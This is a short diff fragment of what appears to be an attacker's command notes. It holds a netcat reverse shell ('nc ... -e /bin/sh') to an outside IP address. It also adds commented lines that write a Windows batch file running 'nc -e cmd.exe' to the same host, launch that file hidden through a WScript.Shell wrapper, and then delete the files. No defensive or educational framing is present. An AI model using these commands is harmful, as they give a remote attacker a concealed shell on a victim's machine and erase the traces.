@@ -24,10 +24,10 @@ $mkdir /tmp/test >> /tmp/cmd_history.txt
 
 $nc 43.200.152.72 59210 -e /bin/sh
 
+#echo nc -e cmd.exe 43.200.152.72 59210 >> c:\execNC.bat
 #echo Set WshShell = CreateObject("WScript.Shell") >> c:\hideCMD.bat
-#echo WshShell.Exec chr(34) & ".\test2.bat" & chr(34), 0 >> c:\hideCMD.bat
+#echo WshShell.Exec chr(34) & "c:\execNC.bat" & chr(34), 0 >> c:\hideCMD.bat
 #echo Set WshShell = Nothing >> c:\hideCMD.bat
-#echo  >> c:\execNC.bat
 #c:\hideCMD.bat
 #del c:\hideCMD.bat
 #del c:\execNC.bat
